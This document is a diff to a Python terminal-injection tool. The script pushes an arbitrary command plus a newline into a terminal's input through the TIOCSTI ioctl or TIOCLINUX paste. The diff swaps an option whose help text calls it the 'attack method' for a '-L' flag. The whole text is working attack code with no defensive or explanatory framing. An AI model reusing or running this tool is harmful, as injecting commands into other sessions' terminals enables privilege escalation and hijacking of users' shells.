@@ -40,8 +40,6 @@ def push(s):
     fd = os.open('/dev/tty', os.O_RDONLY)
     push_fd(fd, s)
 
-methods['TIOCSTI'] = push
-
 TIOCL_SETSEL = 2
 TIOCL_SELLINE = 2
 TIOCL_PASTESEL = 3
@@ -82,21 +80,21 @@ def paste(s):
             return
     paste_fd(2, s)
 
-methods['TIOCLINUX'] = paste
-
 def str_to_bytes(s):
     return memoryview(os.fsencode(s)).cast('c')
 
 def main():
     ap = argparse.ArgumentParser()
-    ap.add_argument('--method', choices=['TIOCSTI', 'TIOCLINUX'], default='TIOCSTI', help='attack method')
+    ap.add_argument('-L', action='store_true', help='use TIOCLINUX')
     ap.add_argument('command', metavar='COMMAND')
     ap.add_argument('args', metavar='ARG', nargs='*')
     options = ap.parse_args()
     cmdline = [options.command] + options.args + ['\n']
     cmdline = ' '.join(cmdline)
     cmdline = str_to_bytes(cmdline)
-    method = methods[options.method]
+    method = push
+    if options.L:
+        method = paste
     method(cmdline)
 
 if __name__ == '__main__':
